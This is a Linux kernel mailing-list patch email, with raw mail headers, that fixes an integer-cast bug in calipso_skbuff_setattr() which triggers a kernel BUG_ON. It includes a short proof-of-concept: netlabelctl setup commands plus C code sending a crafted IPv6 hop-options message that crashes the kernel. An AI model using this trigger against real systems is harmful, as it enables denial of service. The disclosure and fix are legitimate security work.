Received: from mail-pf1-f180.google.com (mail-pf1-f180.google.com [209.85.210.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8E49025A655
	for <linux-security-module@vger.kernel.org>; Fri, 19 Dec 2025 17:37:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1766165823; cv=none; b=GystWMVDxZI8zpMZT34zxU6Cs2eINaTpaDqupycW8nk51X4lBvdV1QlOFvn1w2lLentFVIK4BRnvlfFXsthbcLcORmaoA69RKg0qzTXwB2ksjedEYgQle6Sv7YgQAC6SIxq+F/p0vhHhY6LTeG8Nxh78Wo7Tyy472kbMmxutlOo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1766165823; c=relaxed/simple;
	bh=fBPcLJzYU1D6olJZyG5QeOnFX1y9SnFqnMzwb2S3bOk=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=CJhMnwTYlUnlSEfANtaM2E2o++GdqvUAe3CRf1S+/vci8yiG9R9JveFmx8oqqY46dGp2e6p78I+Hl3zKY8Mz0NYQ6v7P7hyKhEheCu7SAmU04qOsPdgP7KzQg71CEu3QFtLim6gdH8LUD/r7XHVvVr8xOJqEG95L34T8vqJOHuY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=qYrTR9Zj; arc=none smtp.client-ip=209.85.210.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="qYrTR9Zj"
Received: by mail-pf1-f180.google.com with SMTP id d2e1a72fcca58-7fbbb84f034so1659002b3a.0
        for <linux-security-module@vger.kernel.org>; Fri, 19 Dec 2025 09:37:01 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1766165820; x=1766770620; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=qWEkn28lSdsbrh7pndq+YOZrud9XonPh1681Hfh8gwc=;
        b=qYrTR9Zj4SriTC+cbYu2aCgeK/JMdMTWXP4/db1cro68/fkw8DaE4axBwVkkGr4KQh
         fRi8wV7gZbYkKAw3hcNgLmlk3lTIYvehe933PFDCIpQbe7VTezvIJdeWUP7vOZW34SY6
         aqTIg6V/29tMqx+OPmHb8ItLbBDLywJmC+3lHUtcQ3AHt4coxsFScXcq+4hTqaNB9NmM
         FgfluVwDZDYiEDF27sTaxfDat17qryYTBib5okRnwONk+UEChQvSVThBPjrIt2LZxEVy
         Adv4friksAt2r8jGIAv8L0B3TkuKVT1MKfCHeXwe4wo1afazBKec5r2LLb4SWvKN3Z0t
         z/jw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1766165820; x=1766770620;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=qWEkn28lSdsbrh7pndq+YOZrud9XonPh1681Hfh8gwc=;
        b=BKMQiKPe/vL/8wydaRchpSoDimhm9krGfLO2ba7wlzCor4ABKhMi8F+CHdvxQ+ThmX
         oEr10vmVriwy1Wpn2GNC+jddrsRi/N7uuRvgmWsnISZBGpYhmtfYfz96uzRg93dpG/Mi
         sQ42WpMAi08ipf7bhmczTkFwFChAJaXwmiCMSDnYp/mabO3cOEATKo2CYhWjWKXLxOBm
         R3UAc3mCuN7Yyu5pQYySyuniTfNYrJZNHS4q3TTKCj3qtY1oaWCEkuPlv/neFswE8eYS
         Hz/lm7t/HE5K+UR2mp78ELPBDULlt859mvZYtGDr1a2TRJB+4G9l1yf8nHXRQvFIXt8J
         CsYA==
X-Forwarded-Encrypted: i=1; AJvYcCWwxi60SaRMvX34zrWjZ2d7i6xPqHQ/o3yj1etmUUnza4uIBEwWQRCQRIS+fjzVSGFPZgNaLio+cqEeq1uV8r9EIBjgM48=@vger.kernel.org
X-Gm-Message-State: AOJu0YzFJBeo48ZTAykgF1vrNJG4QEBD2BD7padlsaYyxqWd4PMA7paM
	AxnzuVINxYsyJR6aG/oAnpYiXIi4aO3WoDvVOHo671b6ljUiWm4oje6mG2BuWAuAlw==
X-Gm-Gg: AY/fxX5TupXpxXuBZtgMV+o+atIVM/i3lRgrobjK9bWj7bf1BRffazH8VCS0dDSLQrG
	zc76ZGn7sL2pmaekEma54Wqui1AQtLm2rNoO7lvMNVyuXiQkbGX6q6AUM+iRnGrrM84WxtblZ7c
	nYKs0xMNsPFHueP7feCqOoiA9F0lzmi74XV/72g8aAe9N2CyMZQdIITmmNGOJIN0x6DKcPSqavF
	gJq+h9grAtiIOgMzpGckaC35GpYfMl2Accu+FDnjv/9cqO6lP5ilrGYdGMU1Gv324CiOW9Mxo2T
	KrnSPRHJgbG2hgTujZ0D9b25/MBmfefQ91CG85Rg6jJXBlJUV7ZxJ1b/Qawa8ckayaa4PJKG/ds
	tRKIwEbilNZxwSB886N2HUPATIGpcchg1d7gEowtWVIM91I/hrXbs1R34oSMRPxX/YJyAVvFt+N
	Spo5aY/aW/9INdCRpqqPW/RxMNWVcYkm70vIuOIA6x1v1awIQGuw==
X-Google-Smtp-Source: AGHT+IGZmLahTbQF2vXNJwc6Yh8rcMpPUTa8s3yQUjD19Kf28sYcltQks0QBdNLfHalPlNgYh5BpCQ==
X-Received: by 2002:a05:7022:428b:b0:11b:94ab:be03 with SMTP id a92af1059eb24-121722ab5efmr4022936c88.20.1766165820360;
        Fri, 19 Dec 2025 09:37:00 -0800 (PST)
Received: from will-mint.dhcp.asu.edu (ip72-200-102-19.tc.ph.cox.net. [72.200.102.19])
        by smtp.googlemail.com with ESMTPSA id a92af1059eb24-121724de268sm7982235c88.8.2025.12.19.09.36.59
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 19 Dec 2025 09:36:59 -0800 (PST)
From: Will Rosenberg <whrosenb@asu.edu>
To: 
Cc: security@kernel.org,
	Will Rosenberg <whrosenb@asu.edu>,
	Paul Moore <paul@paul-moore.com>,
	"David S. Miller" <davem@davemloft.net>,
	David Ahern <dsahern@kernel.org>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Huw Davies <huw@codeweavers.com>,
	netdev@vger.kernel.org,
	linux-security-module@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
Date: Fri, 19 Dec 2025 10:36:37 -0700
Message-Id: <20251219173637.797418-1-whrosenb@asu.edu>
X-Mailer: git-send-email 2.34.1
Precedence: bulk
X-Mailing-List: linux-security-module@vger.kernel.org
List-Id: <linux-security-module.vger.kernel.org>
List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

There exists a kernel oops caused by a BUG_ON(nhead < 0) at
net/core/skbuff.c:2232 in pskb_expand_head().
This bug is triggered as part of the calipso_skbuff_setattr()
routine when skb_cow() is passed headroom > INT_MAX
(i.e. (int)(skb_headroom(skb) + len_delta) < 0).

The root cause of the bug is due to an implicit integer cast in
__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
that delta = headroom - skb_headroom(skb) is never negative, otherwise
we will trigger a BUG_ON in pskb_expand_head(). However, if
headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
becomes negative, and pskb_expand_head() is passed a negative value for
nhead.

Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
by only using skb_cow() to grow headroom.

PoC:
	Using `netlabelctl` tool:

        netlabelctl map del default
        netlabelctl calipso add pass doi:7
        netlabelctl map add default address:0::1/128 protocol:calipso,7

        Then run the following PoC:

        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

        // setup msghdr
        int cmsg_size = 2;
        int cmsg_len = 0x60;
        struct msghdr msg;
        struct sockaddr_in6 dest_addr;
        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
                        sizeof(struct cmsghdr) + cmsg_len);
        msg.msg_name = &dest_addr;
        msg.msg_namelen = sizeof(dest_addr);
        msg.msg_iov = NULL;
        msg.msg_iovlen = 0;
        msg.msg_control = cmsg;
        msg.msg_controllen = cmsg_len;
        msg.msg_flags = 0;

        // setup sockaddr
        dest_addr.sin6_family = AF_INET6;
        dest_addr.sin6_port = htons(31337);
        dest_addr.sin6_flowinfo = htonl(31337);
        dest_addr.sin6_addr = in6addr_loopback;
        dest_addr.sin6_scope_id = 31337;

        // setup cmsghdr
        cmsg->cmsg_len = cmsg_len;
        cmsg->cmsg_level = IPPROTO_IPV6;
        cmsg->cmsg_type = IPV6_HOPOPTS;
        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80

        sendmsg(fd, &msg, 0);

Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly.")
Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
---

Notes:
    -Changing __skb_cow() would likely require an audit of all its use
    cases due to its long legacy in the kernel. After private discussions,
    it was decided that this patch should be applied to calipso to remedy
    the immediate symptoms and allow for easy backporting. However, net
    devs should consider remedying the root cause through __skb_cow()
    and skb_cow().
    
    -Paul, please let me know if I should add any form of credit for
    the patch code, such as "Suggested-By."

 net/ipv6/calipso.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
index df1986973430..21f6ed126253 100644
--- a/net/ipv6/calipso.c
+++ b/net/ipv6/calipso.c
@@ -1342,7 +1342,8 @@ static int calipso_skbuff_setattr(struct sk_buff *skb,
 	/* At this point new_end aligns to 4n, so (new_end & 4) pads to 8n */
 	pad = ((new_end & 4) + (end & 7)) & 7;
 	len_delta = new_end - (int)end + pad;
-	ret_val = skb_cow(skb, skb_headroom(skb) + len_delta);
+	ret_val = skb_cow(skb,
+			  skb_headroom(skb) + (len_delta > 0 ? len_delta : 0));
 	if (ret_val < 0)
 		return ret_val;
 

base-commit: ea1013c1539270e372fc99854bc6e4d94eaeff66
-- 
2.34.1

